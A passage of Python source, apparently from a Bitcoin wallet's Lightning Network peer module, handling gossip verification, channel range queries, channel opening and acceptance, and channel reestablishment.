self.channel_db.add_channel_announcement(chan_anns_chunk)\n            for node_anns_chunk in chunks(node_anns, 100):\n                self.verify_node_announcements(node_anns_chunk)\n                self.channel_db.add_node_announcement(node_anns_chunk)\n            for chan_upds_chunk in chunks(chan_upds, 1000):\n                categorized_chan_upds = self.channel_db.add_channel_updates(\n                    chan_upds_chunk, max_age=self.network.lngossip.max_age)\n                orphaned = categorized_chan_upds.orphaned\n                if orphaned:\n                    self.logger.info(f'adding {len(orphaned)} unknown channel ids')\n                    orphaned_ids = [c['short_channel_id'] for c in orphaned]\n                    await self.network.lngossip.add_new_ids(orphaned_ids)\n                    for chan_upd_payload in orphaned:\n                        short_channel_id = ShortChannelID(chan_upd_payload['short_channel_id'])\n                        self.orphan_channel_updates[short_channel_id] = chan_upd_payload\n                        while len(self.orphan_channel_updates) > 25:\n                            self.orphan_channel_updates.popitem(last=False)\n                if categorized_chan_upds.good:\n                    self.logger.debug(f'on_channel_update: {len(categorized_chan_upds.good)}/{len(chan_upds_chunk)}')\n    def verify_channel_announcements(self, chan_anns):\n        for payload in chan_anns:\n            h = sha256d(payload['raw'][2+256:])\n            pubkeys = [payload['node_id_1'], payload['node_id_2'], payload['bitcoin_key_1'], payload['bitcoin_key_2']]\n            sigs = [payload['node_signature_1'], payload['node_signature_2'], payload['bitcoin_signature_1'], payload['bitcoin_signature_2']]\n            for pubkey, sig in zip(pubkeys, sigs):\n                if not ecc.verify_signature(pubkey, sig, h):\n                    raise Exception('signature failed')\n    def verify_node_announcements(self, node_anns):\n        for payload in node_anns:\n            pubkey = payload['node_id']\n            signature = payload['signature']\n            h = sha256d(payload['raw'][66:])\n            if not ecc.verify_signature(pubkey, signature, h):\n                raise Exception('signature failed')\n    async def query_gossip(self):\n        try:\n            await asyncio.wait_for(self.initialized, LN_P2P_NETWORK_TIMEOUT)\n        except Exception as e:\n            raise GracefulDisconnect(f\"Failed to initialize: {e!r}\") from e\n        if self.lnworker == self.lnworker.network.lngossip:\n            try:\n                ids, complete = await asyncio.wait_for(self.get_channel_range(), LN_P2P_NETWORK_TIMEOUT)\n            except asyncio.TimeoutError as e:\n                raise GracefulDisconnect(\"query_channel_range timed out\") from e\n            self.logger.info('Received {} channel ids. (complete: {})'.format(len(ids), complete))\n            await self.lnworker.add_new_ids(ids)\n            while True:\n                todo = self.lnworker.get_ids_to_query()\n                if not todo:\n                    await asyncio.sleep(1)\n                    continue\n                await self.get_short_channel_ids(todo)\n    async def get_channel_range(self):\n        first_block = constants.net.BLOCK_HEIGHT_FIRST_LIGHTNING_CHANNELS\n        num_blocks = self.lnworker.network.get_local_height() - first_block\n        self.query_channel_range(first_block, num_blocks)\n        intervals = []\n        ids = set()\n        while True:\n            index, num, complete, _ids = await self.reply_channel_range.get()\n            ids.update(_ids)\n            intervals.append((index, index+num))\n            intervals.sort()\n            while len(intervals) > 1:\n                a,b = intervals[0]\n                c,d = intervals[1]\n                if not (a <= c and a <= b and c <= d):\n                    raise Exception(f\"insane reply_channel_range intervals {(a,b,c,d)}\")\n                if b >= c:\n                    intervals = [(a,d)] + intervals[2:]\n                else:\n                    break\n            if len(intervals) == 1 and complete:\n                a, b = intervals[0]\n                if a <= first_block and b >= first_block + num_blocks:\n                    break\n        return ids, complete\n    def request_gossip(self, timestamp=0):\n        if timestamp == 0:\n            self.logger.info('requesting whole channel graph')\n        else:\n            self.logger.info(f'requesting channel graph since {datetime.fromtimestamp(timestamp).ctime()}')\n        self.send_message(\n            'gossip_timestamp_filter',\n            chain_hash=constants.net.rev_genesis_bytes(),\n            first_timestamp=timestamp,\n            timestamp_range=b'\\xff'*4)\n    def query_channel_range(self, first_block, num_blocks):\n        self.logger.info(f'query channel range {first_block} {num_blocks}')\n        self.send_message(\n            'query_channel_range',\n            chain_hash=constants.net.rev_genesis_bytes(),\n            first_blocknum=first_block,\n            number_of_blocks=num_blocks)\n    def decode_short_ids(self, encoded):\n        if encoded[0] == 0:\n            decoded = encoded[1:]\n        elif encoded[0] == 1:\n            decoded = zlib.decompress(encoded[1:])\n        else:\n            raise Exception(f'decode_short_ids: unexpected first byte: {encoded[0]}')\n        ids = [decoded[i:i+8] for i in range(0, len(decoded), 8)]\n        return ids\n    def on_reply_channel_range(self, payload):\n        first = payload['first_blocknum']\n        num = payload['number_of_blocks']\n        complete = bool(int.from_bytes(payload['complete'], 'big'))\n        encoded = payload['encoded_short_ids']\n        ids = self.decode_short_ids(encoded)\n        self.reply_channel_range.put_nowait((first, num, complete, ids))\n    async def get_short_channel_ids(self, ids):\n        self.logger.info(f'Querying {len(ids)} short_channel_ids')\n        assert not self.querying.is_set()\n        self.query_short_channel_ids(ids)\n        await self.querying.wait()\n        self.querying.clear()\n    def query_short_channel_ids(self, ids, compressed=True):\n        ids = sorted(ids)\n        s = b''.join(ids)\n        encoded = zlib.compress(s) if compressed else s\n        prefix = b'\\x01' if compressed else b'\\x00'\n        self.send_message(\n            'query_short_channel_ids',\n            chain_hash=constants.net.rev_genesis_bytes(),\n            len=1+len(encoded),\n            encoded_short_ids=prefix+encoded)\n    async def _message_loop(self):\n        try:\n            await asyncio.wait_for(self.initialize(), LN_P2P_NETWORK_TIMEOUT)\n        except (OSError, asyncio.TimeoutError, HandshakeFailed) as e:\n            raise GracefulDisconnect(f'initialize failed: {repr(e)}') from e\n        async for msg in self.transport.read_messages():\n            self.process_message(msg)\n            await asyncio.sleep(.01)\n    def on_reply_short_channel_ids_end(self, payload):\n        self.querying.set()\n    def close_and_cleanup(self):\n        try:\n            if self.transport:\n                self.transport.close()\n        except:\n            pass\n        self.lnworker.peer_closed(self)\n    def is_static_remotekey(self):\n        return bool(self.features & LnFeatures.OPTION_STATIC_REMOTEKEY_OPT)\n    def make_local_config(self, funding_sat: int, push_msat: int, initiator: HTLCOwner) -> LocalConfig:\n        channel_seed = os.urandom(32)\n        initial_msat = funding_sat * 1000 - push_msat if initiator == LOCAL else push_msat\n        if self.is_static_remotekey():\n            wallet = self.lnworker.wallet\n            assert wallet.txin_type == 'p2wpkh'\n            addr = wallet.get_new_sweep_address_for_channel()\n            static_remotekey = bfh(wallet.get_public_key(addr))\n        else:\n            static_remotekey = None\n        local_config = LocalConfig.from_seed(\n            channel_seed=channel_seed,\n            static_remotekey=static_remotekey,\n            to_self_delay=self.network.config.get('lightning_to_self_delay', 7 * 576),\n            dust_limit_sat=bitcoin.DUST_LIMIT_DEFAULT_SAT_LEGACY,\n            max_htlc_value_in_flight_msat=funding_sat * 1000,\n            max_accepted_htlcs=5,\n            initial_msat=initial_msat,\n            reserve_sat=funding_sat // 100,\n            funding_locked_received=False,\n            was_announced=False,\n            current_commitment_signature=None,\n            current_htlc_signatures=b'',\n            htlc_minimum_msat=1,\n        )\n        local_config.validate_params(funding_sat=funding_sat)\n        return local_config\n    def temporarily_reserve_funding_tx_change_address(func):\n        async def wrapper(self: 'Peer', *args, **kwargs):\n            funding_tx = kwargs['funding_tx']  \n            wallet = self.lnworker.wallet\n            change_addresses = [txout.address for txout in funding_tx.outputs()\n                                if wallet.is_change(txout.address)]\n            for addr in change_addresses:\n                wallet.set_reserved_state_of_address(addr, reserved=True)\n            try:\n                return await func(self, *args, **kwargs)\n            finally:\n                for addr in change_addresses:\n                    self.lnworker.wallet.set_reserved_state_of_address(addr, reserved=False)\n        return wrapper\n    @log_exceptions\n    @temporarily_reserve_funding_tx_change_address\n    async def channel_establishment_flow(\n            self, *,\n            password: Optional[str],\n            funding_tx: 'PartialTransaction',\n            funding_sat: int,\n            push_msat: int,\n            temp_channel_id: bytes\n    ) -> Tuple[Channel, 'PartialTransaction']:\n        await asyncio.wait_for(self.initialized, LN_P2P_NETWORK_TIMEOUT)\n        feerate = self.lnworker.current_feerate_per_kw()\n        local_config = self.make_local_config(funding_sat, push_msat, LOCAL)\n        if funding_sat > LN_MAX_FUNDING_SAT:\n            raise Exception(f\"MUST set funding_satoshis to less than 2^24 satoshi. {funding_sat} sat > {LN_MAX_FUNDING_SAT}\")\n        if push_msat > 1000 * funding_sat:\n            raise Exception(f\"MUST set push_msat to equal or less than 1000 * funding_satoshis: {push_msat} msat > {1000 * funding_sat} msat\")\n        if funding_sat < lnutil.MIN_FUNDING_SAT:\n            raise Exception(f\"funding_sat too low: {funding_sat} < {lnutil.MIN_FUNDING_SAT}\")\n        per_commitment_secret_first = get_per_commitment_secret_from_seed(local_config.per_commitment_secret_seed,\n                                                                          RevocationStore.START_INDEX)\n        per_commitment_point_first = secret_to_pubkey(int.from_bytes(per_commitment_secret_first, 'big'))\n        self.send_message(\n            \"open_channel\",\n            temporary_channel_id=temp_channel_id,\n            chain_hash=constants.net.rev_genesis_bytes(),\n            funding_satoshis=funding_sat,\n            push_msat=push_msat,\n            dust_limit_satoshis=local_config.dust_limit_sat,\n            feerate_per_kw=feerate,\n            max_accepted_htlcs=local_config.max_accepted_htlcs,\n            funding_pubkey=local_config.multisig_key.pubkey,\n            revocation_basepoint=local_config.revocation_basepoint.pubkey,\n            htlc_basepoint=local_config.htlc_basepoint.pubkey,\n            payment_basepoint=local_config.payment_basepoint.pubkey,\n            delayed_payment_basepoint=local_config.delayed_basepoint.pubkey,\n            first_per_commitment_point=per_commitment_point_first,\n            to_self_delay=local_config.to_self_delay,\n            max_htlc_value_in_flight_msat=local_config.max_htlc_value_in_flight_msat,\n            channel_flags=0x00,  \n            channel_reserve_satoshis=local_config.reserve_sat,\n            htlc_minimum_msat=local_config.htlc_minimum_msat,\n        )\n        payload = await self.wait_for_message('accept_channel', temp_channel_id)\n        remote_per_commitment_point = payload['first_per_commitment_point']\n        funding_txn_minimum_depth = payload['minimum_depth']\n        if funding_txn_minimum_depth <= 0:\n            raise Exception(f\"minimum depth too low, {funding_txn_minimum_depth}\")\n        if funding_txn_minimum_depth > 30:\n            raise Exception(f\"minimum depth too high, {funding_txn_minimum_depth}\")\n        remote_config = RemoteConfig(\n            payment_basepoint=OnlyPubkeyKeypair(payload['payment_basepoint']),\n            multisig_key=OnlyPubkeyKeypair(payload[\"funding_pubkey\"]),\n            htlc_basepoint=OnlyPubkeyKeypair(payload['htlc_basepoint']),\n            delayed_basepoint=OnlyPubkeyKeypair(payload['delayed_payment_basepoint']),\n            revocation_basepoint=OnlyPubkeyKeypair(payload['revocation_basepoint']),\n            to_self_delay=payload['to_self_delay'],\n            dust_limit_sat=payload['dust_limit_satoshis'],\n            max_htlc_value_in_flight_msat=payload['max_htlc_value_in_flight_msat'],\n            max_accepted_htlcs=payload[\"max_accepted_htlcs\"],\n            initial_msat=push_msat,\n            reserve_sat=payload[\"channel_reserve_satoshis\"],\n            htlc_minimum_msat=payload['htlc_minimum_msat'],\n            next_per_commitment_point=remote_per_commitment_point,\n            current_per_commitment_point=None,\n        )\n        remote_config.validate_params(funding_sat=funding_sat)\n        if remote_config.reserve_sat < local_config.dust_limit_sat:\n            raise Exception(\"violated constraint: remote_config.reserve_sat < local_config.dust_limit_sat\")\n        if local_config.reserve_sat < remote_config.dust_limit_sat:\n            raise Exception(\"violated constraint: local_config.reserve_sat < remote_config.dust_limit_sat\")\n        redeem_script = funding_output_script(local_config, remote_config)\n        funding_address = bitcoin.redeem_script_to_address('p2wsh', redeem_script)\n        funding_output = PartialTxOutput.from_address_and_value(funding_address, funding_sat)\n        dummy_output = PartialTxOutput.from_address_and_value(ln_dummy_address(), funding_sat)\n        funding_tx.outputs().remove(dummy_output)\n        funding_tx.add_outputs([funding_output])\n        funding_tx.set_rbf(False)\n        self.lnworker.wallet.sign_transaction(funding_tx, password)\n        if not funding_tx.is_complete() and not funding_tx.is_segwit():\n            raise Exception('Funding transaction is not complete')\n        funding_txid = funding_tx.txid()\n        assert funding_txid\n        funding_index = funding_tx.outputs().index(funding_output)\n        channel_id, funding_txid_bytes = channel_id_from_funding_tx(funding_txid, funding_index)\n        outpoint = Outpoint(funding_txid, funding_index)\n        constraints = ChannelConstraints(capacity=funding_sat, is_initiator=True, funding_txn_minimum_depth=funding_txn_minimum_depth)\n        chan_dict = self.create_channel_storage(channel_id, outpoint, local_config, remote_config, constraints)\n        chan = Channel(chan_dict,\n                       sweep_address=self.lnworker.sweep_address,\n                       lnworker=self.lnworker,\n                       initial_feerate=feerate)\n        chan.storage['funding_inputs'] = [txin.prevout.to_json() for txin in funding_tx.inputs()]\n        if isinstance(self.transport, LNTransport):\n            chan.add_or_update_peer_addr(self.transport.peer_addr)\n        sig_64, _ = chan.sign_next_commitment()\n        self.temp_id_to_id[temp_channel_id] = channel_id\n        self.send_message(\"funding_created\",\n            temporary_channel_id=temp_channel_id,\n            funding_txid=funding_txid_bytes,\n            funding_output_index=funding_index,\n            signature=sig_64)\n        self.funding_created_sent.add(channel_id)\n        payload = await self.wait_for_message('funding_signed', channel_id)\n        self.logger.info('received funding_signed')\n        remote_sig = payload['signature']\n        chan.receive_new_commitment(remote_sig, [])\n        chan.open_with_first_pcp(remote_per_commitment_point, remote_sig)\n        chan.set_state(ChannelState.OPENING)\n        self.lnworker.add_new_channel(chan)\n        return chan, funding_tx\n    def create_channel_storage(self, channel_id, outpoint, local_config, remote_config, constraints):\n        chan_dict = {\n            \"node_id\": self.pubkey.hex(),\n            \"channel_id\": channel_id.hex(),\n            \"short_channel_id\": None,\n            \"funding_outpoint\": outpoint,\n            \"remote_config\": remote_config,\n            \"local_config\": local_config,\n            \"constraints\": constraints,\n            \"remote_update\": None,\n            \"state\": ChannelState.PREOPENING.name,\n            'onion_keys': {},\n            'data_loss_protect_remote_pcp': {},\n            \"log\": {},\n            \"revocation_store\": {},\n            \"static_remotekey_enabled\": self.is_static_remotekey(), \n        }\n        return StoredDict(chan_dict, None, [])\n    async def on_open_channel(self, payload):\n        if payload['chain_hash'] != constants.net.rev_genesis_bytes():\n            raise Exception('wrong chain_hash')\n        funding_sat = payload['funding_satoshis']\n        push_msat = payload['push_msat']\n        feerate = payload['feerate_per_kw']  \n        temp_chan_id = payload['temporary_channel_id']\n        local_config = self.make_local_config(funding_sat, push_msat, REMOTE)\n        if funding_sat > LN_MAX_FUNDING_SAT:\n            raise Exception(f\"MUST set funding_satoshis to less than 2^24 satoshi. {funding_sat} sat > {LN_MAX_FUNDING_SAT}\")\n        if push_msat > 1000 * funding_sat:\n            raise Exception(f\"MUST set push_msat to equal or less than 1000 * funding_satoshis: {push_msat} msat > {1000 * funding_sat} msat\")\n        if funding_sat < lnutil.MIN_FUNDING_SAT:\n            raise Exception(f\"funding_sat too low: {funding_sat} < {lnutil.MIN_FUNDING_SAT}\")\n        remote_config = RemoteConfig(\n            payment_basepoint=OnlyPubkeyKeypair(payload['payment_basepoint']),\n            multisig_key=OnlyPubkeyKeypair(payload['funding_pubkey']),\n            htlc_basepoint=OnlyPubkeyKeypair(payload['htlc_basepoint']),\n            delayed_basepoint=OnlyPubkeyKeypair(payload['delayed_payment_basepoint']),\n            revocation_basepoint=OnlyPubkeyKeypair(payload['revocation_basepoint']),\n            to_self_delay=payload['to_self_delay'],\n            dust_limit_sat=payload['dust_limit_satoshis'],\n            max_htlc_value_in_flight_msat=payload['max_htlc_value_in_flight_msat'],\n            max_accepted_htlcs=payload['max_accepted_htlcs'],\n            initial_msat=funding_sat * 1000 - push_msat,\n            reserve_sat=payload['channel_reserve_satoshis'],\n            htlc_minimum_msat=payload['htlc_minimum_msat'],\n            next_per_commitment_point=payload['first_per_commitment_point'],\n            current_per_commitment_point=None,\n        )\n        remote_config.validate_params(funding_sat=funding_sat)\n        if remote_config.initial_msat < calc_fees_for_commitment_tx(num_htlcs=0,\n                                                                    feerate=feerate,\n                                                                    is_local_initiator=False)[REMOTE]:\n            raise Exception(\"the funder's amount for the initial commitment transaction is not sufficient for full fee payment\")\n        if (local_config.initial_msat <= 1000 * payload['channel_reserve_satoshis']\n                and remote_config.initial_msat <= 1000 * payload['channel_reserve_satoshis']):\n            raise Exception(\"both to_local and to_remote amounts for the initial commitment transaction are less than or equal to channel_reserve_satoshis\")\n        per_commitment_secret_first = get_per_commitment_secret_from_seed(local_config.per_commitment_secret_seed,\n                                                                          RevocationStore.START_INDEX)\n        per_commitment_point_first = secret_to_pubkey(int.from_bytes(per_commitment_secret_first, 'big'))\n        min_depth = 3\n        self.send_message('accept_channel',\n            temporary_channel_id=temp_chan_id,\n            dust_limit_satoshis=local_config.dust_limit_sat,\n            max_htlc_value_in_flight_msat=local_config.max_htlc_value_in_flight_msat,\n            channel_reserve_satoshis=local_config.reserve_sat,\n            htlc_minimum_msat=local_config.htlc_minimum_msat,\n            minimum_depth=min_depth,\n            to_self_delay=local_config.to_self_delay,\n            max_accepted_htlcs=local_config.max_accepted_htlcs,\n            funding_pubkey=local_config.multisig_key.pubkey,\n            revocation_basepoint=local_config.revocation_basepoint.pubkey,\n            payment_basepoint=local_config.payment_basepoint.pubkey,\n            delayed_payment_basepoint=local_config.delayed_basepoint.pubkey,\n            htlc_basepoint=local_config.htlc_basepoint.pubkey,\n            first_per_commitment_point=per_commitment_point_first,\n        )\n        funding_created = await self.wait_for_message('funding_created', temp_chan_id)\n        funding_idx = funding_created['funding_output_index']\n        funding_txid = bh2u(funding_created['funding_txid'][::-1])\n        channel_id, funding_txid_bytes = channel_id_from_funding_tx(funding_txid, funding_idx)\n        constraints = ChannelConstraints(capacity=funding_sat, is_initiator=False, funding_txn_minimum_depth=min_depth)\n        outpoint = Outpoint(funding_txid, funding_idx)\n        chan_dict = self.create_channel_storage(channel_id, outpoint, local_config, remote_config, constraints)\n        chan = Channel(chan_dict,\n                       sweep_address=self.lnworker.sweep_address,\n                       lnworker=self.lnworker,\n                       initial_feerate=feerate)\n        chan.storage['init_timestamp'] = int(time.time())\n        if isinstance(self.transport, LNTransport):\n            chan.add_or_update_peer_addr(self.transport.peer_addr)\n        remote_sig = funding_created['signature']\n        chan.receive_new_commitment(remote_sig, [])\n        sig_64, _ = chan.sign_next_commitment()\n        self.send_message('funding_signed',\n            channel_id=channel_id,\n            signature=sig_64,\n        )\n        self.funding_signed_sent.add(chan.channel_id)\n        chan.open_with_first_pcp(payload['first_per_commitment_point'], remote_sig)\n        chan.set_state(ChannelState.OPENING)\n        self.lnworker.add_new_channel(chan)\n    async def trigger_force_close(self, channel_id: bytes):\n        await self.initialized\n        latest_point = secret_to_pubkey(42) \n        self.send_message(\n            \"channel_reestablish\",\n            channel_id=channel_id,\n            next_commitment_number=0,\n            next_revocation_number=0,\n            your_last_per_commitment_secret=0,\n            my_current_per_commitment_point=latest_point)\n    async def reestablish_channel(self, chan: Channel):\n        await self.initialized\n        chan_id = chan.channel_id\n        assert ChannelState.PREOPENING < chan.get_state() < ChannelState.FORCE_CLOSING\n        if chan.peer_state != PeerState.DISCONNECTED:\n            self.logger.info(f'reestablish_channel was called but channel {chan.get_id_for_log()} '\n                             f'already in peer_state {chan.peer_state!r}')\n            return\n        chan.peer_state = PeerState.REESTABLISHING\n        util.trigger_callback('channel', self.lnworker.wallet, chan)\n        chan.hm.discard_unsigned_remote_updates()\n        oldest_unrevoked_local_ctn = chan.get_oldest_unrevoked_ctn(LOCAL)\n        latest_local_ctn = chan.get_latest_ctn(LOCAL)\n        next_local_ctn = chan.get_next_ctn(LOCAL)\n        oldest_unrevoked_remote_ctn = chan.get_oldest_unrevoked_ctn(REMOTE)\n        latest_remote_ctn = chan.get_latest_ctn(REMOTE)\n        next_remote_ctn = chan.get_next_ctn(REMOTE)\n        assert self.features & LnFeatures.OPTION_DATA_LOSS_PROTECT_OPT\n        if chan.is_static_remotekey_enabled():\n            latest_secret, latest_point = chan.get_secret_and_point(LOCAL, 0)\n        else:\n            latest_secret, latest_point = chan.get_secret_and_point(LOCAL, latest_local_ctn)\n        if oldest_unrevoked_remote_ctn == 0:\n            last_rev_secret = 0\n        else:\n            last_rev_index = oldest_unrevoked_remote_ctn - 1\n            last_rev_secret = chan.revocation_store.retrieve_secret(RevocationStore.START_INDEX - last_rev_index)\n        self.send_message(\n            \"channel_reestablish\",\n            channel_id=chan_id,\n            next_commitment_number=next_local_ctn,\n            next_revocation_number=oldest_unrevoked_remote_ctn,\n            your_last_per_commitment_secret=last_rev_secret,\n            my_current_per_commitment_point=latest_point)\n        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): sent channel_reestablish with '\n                         f'(next_local_ctn={next_local_ctn}, '\n                         f'oldest_unrevoked_remote_ctn={oldest_unrevoked_remote_ctn})')\n        while True:\n            try:\n                msg = await self.wait_for_message('channel_reestablish', chan_id)\n                break\n            except asyncio.TimeoutError:\n                self.logger.info('waiting to receive channel_reestablish...')\n                continue\n        their_next_local_ctn = msg[\"next_commitment_number\"]\n        their_oldest_unrevoked_remote_ctn = msg[\"next_revocation_number\"]\n        their_local_pcp = msg.get(\"my_current_per_commitment_point\")\n        their_claim_of_our_last_per_commitment_secret = msg.get(\"your_last_per_commitment_secret\")\n        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): received channel_reestablish with '\n                         f'(their_next_local_ctn={their_next_local_ctn}, '\n                         f'their_oldest_unrevoked_remote_ctn={their_oldest_unrevoked_remote_ctn})')\n        if their_next_local_ctn < 0:\n            raise RemoteMisbehaving(f\"channel reestablish: their_next_local_ctn < 0\")\n        if their_oldest_unrevoked_remote_ctn < 0:\n            raise RemoteMisbehaving(f\"channel reestablish: their_oldest_unrevoked_remote_ctn < 0\")\n        unacked = chan.hm.get_unacked_local_updates()\n        n_replayed_msgs = 0\n        for ctn, messages in unacked.items():\n            if ctn < their_next_local_ctn:\n                continue\n            for raw_upd_msg in messages:\n                self.transport.send_bytes(raw_upd_msg)\n                n_replayed_msgs += 1\n        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): replayed {n_replayed_msgs} unacked messages')\n        we_are_ahead = False\n        they_are_ahead = False\n        if next_remote_ctn != their_next_local_ctn:\n            if their_next_local_ctn == latest_remote_ctn and chan.hm.is_revack_pending(REMOTE):\n                pass\n            else:\n                self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \"\n                                    f\"expected remote ctn {next_remote_ctn}, got {their_next_local_ctn}\")\n                if their_next_local_ctn < next_remote_ctn:\n                    we_are_ahead = True\n                else:\n                    they_are_ahead = True\n        if oldest_unrevoked_local_ctn != their_oldest_unrevoked_remote_ctn:\n            if oldest_unrevoked_local_ctn - 1 == their_oldest_unrevoked_remote_ctn:\n                last_secret, last_point = chan.get_secret_and_point(LOCAL, oldest_unrevoked_local_ctn - 1)\n                next_secret, next_point = chan.get_secret_and_point(LOCAL, oldest_unrevoked_local_ctn + 1)\n                self.send_message(\n                    \"revoke_and_ack\",\n                    channel_id=chan.channel_id,\n                    per_commitment_secret=last_secret,\n                    next_per_commitment_point=next_point)\n            else:\n                self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \"\n                                    f\"expected local ctn {oldest_unrevoked_local_ctn}, got {their_oldest_unrevoked_remote_ctn}\")\n                if their_oldest_unrevoked_remote_ctn < oldest_unrevoked_local_ctn:\n                    we_are_ahead = True\n                else:\n                    they_are_ahead = True\n        def are_datalossprotect_fields_valid() -> bool:\n            if their_local_pcp is None or their_claim_of_our_last_per_commitment_secret is None:\n                return False\n            if their_oldest_unrevoked_remote_ctn > 0:\n                our_pcs, __ = chan.get_secret_and_point(LOCAL, their_oldest_unrevoked_remote_ctn - 1)\n            else:\n                assert their_oldest_unrevoked_remote_ctn == 0\n                our_pcs = bytes(32)\n            if our_pcs != their_claim_of_our_last_per_commitment_secret:\n                self.logger.error(f\"channel_reestablish ({chan.get_id_for_log()}): \"\n                                  f\"(DLP) local PCS mismatch: {bh2u(our_pcs)} != {bh2u(their_claim_of_our_last_per_commitment_secret)}\")\n                return False\n            if chan.is_static_remotekey_enabled():\n                return True\n            try:\n                __, our_remote_pcp = chan.get_secret_and_point(REMOTE, their_next_local_ctn - 1)\n            except RemoteCtnTooFarInFuture:\n                pass\n            else:\n                if our_remote_pcp != their_local_pcp:\n                    self.logger.error(f\"channel_reestablish ({chan.get_id_for_log()}): \"\n                                      f\"(DLP) remote PCP mismatch: {bh2u(our_remote_pcp)} != {bh2u(their_local_pcp)}\")\n                    return False\n            return True\n        if not are_datalossprotect_fields_valid():\n            raise RemoteMisbehaving(\"channel_reestablish: data loss protect fields invalid\")\n        if they_are_ahead:\n            self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): \"\n                                f\"remote is ahead of us! They should force-close. Remote PCP: {bh2u(their_local_pcp)}\")\n            chan.set_data_loss_protect_remote_pcp(their_next_local_ctn - 1, their_local_pcp)\n            self.lnworker.save_channel(chan)\n            chan.peer_state = PeerState.BAD\n            return\n        elif we_are_ahead:\n            self.logger.warning(f\"channel_reestablish ({chan.get_id_for_log()}): we are ahead of remote! trying to force-close.\")\n            await self.lnworker.try_force_closing(chan_id)\n            return\n        chan.peer_state = PeerState.GOOD\n        if chan.is_funded() and their_next_local_ctn == next_local_ctn == 1:\n            self.send_funding_locked(chan)\n        if chan.is_funded() and chan.config[LOCAL].funding_locked_received:\n            self.mark_open(chan)\n        util.trigger_callback('channel', self.lnworker.wallet, chan)\n        if chan.get_state() == ChannelState.SHUTDOWN:\n            await self.send_shutdown(chan)\n    def send_funding_locked(self, chan: Channel):\n        channel_id = chan.channel_id\n        per_commitment_secret_index = RevocationStore.START_INDEX - 1\n        per_commitment_point_second = secret_to_pubkey(int.from_bytes(\n            get_per_commitment_secret_from_seed(chan.config[LOCAL].per_commitment_secret_seed, per_commitment_secret_index), 'big'))\n        self.send_message(\"funding_locked\", channel_id=channel_id, next_per_commitment_point=per_commitment_point_second)\n        if chan.is_funded() and chan.config[LOCAL].funding_locked_received:\n            self.mark_open(chan)\n    def on_funding_locked(self, chan: Channel, payload):\n        self.logger.info(f\"on_funding_locked. channel: {bh2u(chan.channel_id)}\")\n        if not chan.config[LOCAL].funding_locked_received:\n            their_next_point = payload[\"next_per_commitment_point\"]\n            chan.config[REMOTE].next_per_commitment_point = their_next_point\n            chan.config[LOCAL].funding_locked_received = True\n            self.lnworker.save_channel(chan)\n        if chan.is_funded():\n            self.mark_open(chan)\n    def on_network_update(self, chan: Channel, funding_tx_depth: int):\n        if not chan.config[LOCAL].was_announced and funding_tx_depth >= 6:\n            return\n            chan.config[LOCAL].was_announced = True\n            self.lnworker.save_channel(chan)\n            coro = self.handle_announcements(chan)\n            asyncio.run_coroutine_threadsafe(coro, self.network.asyncio_loop)\n    @log_exceptions\n    async def handle_announcements(self, chan: Channel):\n        h, local_node_sig, local_bitcoin_sig = self.send_announcement_signatures(chan)\n        announcement_signatures_msg = await self.announcement_signatures[chan.channel_id].get()\n        remote_node_sig = announcement_signatures_msg[\"node_signature\"]\n        remote_bitcoin_sig = announcement_signatures_msg[\"bitcoin_signature\"]\n        if not ecc.verify_signature(chan.config[REMOTE].multisig_key.pubkey, remote_bitcoin_sig, h):\n            raise Exception(\"bitcoin_sig invalid in announcement_signatures\")\n        if not ecc.verify_signature(self.pubkey, remote_node_sig, h):\n            raise Exception(\"node_sig invalid in announcement_signatures\")\n        node_sigs = [remote_node_sig, local_node_sig]\n        bitcoin_sigs = [remote_bitcoin_sig, local_bitcoin_sig]\n        bitcoin_keys = [chan.config[REMOTE].multisig_key.pubkey, chan.config[LOCAL].multisig_key.pubkey]\n        if self.node_ids[0] > self.node_ids[1]:\n            node_sigs.reverse()\n            bitcoin_sigs.reverse()\n            node_ids = list(reversed(self.node_ids))\n            bitcoin_keys.reverse()\n        else:\n            node_ids = self.node_ids\n        self.send_message(\"channel_announcement\",\n            node_signatures_1=node_sigs[0],\n            node_signatures_2=node_sigs[1],\n            bitcoin_signature_1=bitcoin_sigs[0],\n            bitcoin_signature_2=bitcoin_sigs[1],\n            len=0,\n            chain_hash=constants.net.rev_genesis_bytes(),\n            short_channel_id=chan.short_channel_id,\n            node_id_1=node_ids[0],\n            node_id_2=node_ids[1],\n            bitcoin_key_1=bitcoin_keys[0],\n            bitcoin_key_2=bitcoin_keys[1]\n        )\n    def mark_open(self, chan: Channel):\n        assert chan.is_funded()\n        old_state = chan.get_state()\n        if old_state == ChannelState.OPEN:\n            return\n        if old_state != ChannelState.FUNDED:\n            self.logger.info(f\"cannot mark open ({chan.get_id_for_log()}), current state: {repr(old_state)}\")\n            return\n        assert chan.config[LOCAL].funding_locked_received\n        chan.set_state(ChannelState.OPEN)\n        util.trigger_callback('channel', self.lnworker.wallet, chan)\n        pending_channel_update = self.orphan_channel_updates.get(chan.short_channel_id)\n        if pending_channel_update:\n            chan.set_remote_update(pending_channel_update['raw'])\n        self.logger.info(f\"CHANNEL OPENING COMPLETED ({chan.get_id_for_log()})\")\n        forwarding_enabled = self.network.config.get('lightning_forward_payments', False)\n        if forwarding_enabled:\n            self.logger.info(f\"sending channel update for outgoing edge ({chan.get_id_for_log()})\")\n            chan_upd = chan.get_outgoing_gossip_channel_update()\n            self.transport.send_bytes(chan_upd)\n    def send_announcement_signatures(self, chan: Channel):\n        chan_ann = chan.construct_channel_announcement_without_sigs()\n        preimage = chan_ann[256+2:]\n        msg_hash = sha256d(preimage)\n        bitcoin_signature = ecc.ECPrivkey(chan.config[LOCAL].multisig_key.privkey).sign(msg_hash, sig_string_from_r_and_s)\n        node_signature = ecc.ECPrivkey(self.privkey).sign(msg_hash, sig_string_from_r_and_s)\n        self.send_message(\"announcement_signatures\",\n            channel_id=chan.channel_id,\n            short_channel_id=chan.short_channel_id,\n            node_signature=node_signature,\n            bitcoin_signature=bitcoin_signature\n        )\n        return msg_hash, node_signature, bitcoin_signature\n    def on_update_fail_htlc(self, chan: Channel, payload):\n        htlc_id = payload[\"id\"]\n        reason = payload[\"reason\"]\n        self.logger.info(f\"on_update_fail_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")\n        chan.receive_fail_htlc(htlc_id, 